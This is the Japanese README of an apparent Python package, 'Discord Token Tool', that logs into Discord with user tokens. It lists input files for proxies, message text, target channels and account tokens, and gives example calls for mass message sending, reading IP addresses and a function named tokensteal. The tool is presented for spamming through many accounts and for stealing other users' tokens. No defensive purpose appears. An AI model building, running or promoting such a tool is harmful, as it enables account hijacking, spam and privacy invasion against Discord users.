# Discord Token Tool - DTT
DTTはトークンででログインできるパッケージです

# 使い方
1/proxy.txt #httpだけ
2/content.txt #送るメッセージ
3/channel.txt #送るチャンネルたち
4/tokens.txt #accountのtoken
この上のファイルを用意する
下のコードをいろいろしてrunする
# example code
```
import DTT
from DTT import net

num = 1
net.send(num)#1回送る

id = serverid
net.leave(id)#サーバーから抜けます

net.check()

net.guilds()

net.ip()#ipがとれます


userid = 1234567890
net.tokensteal(userid):
```
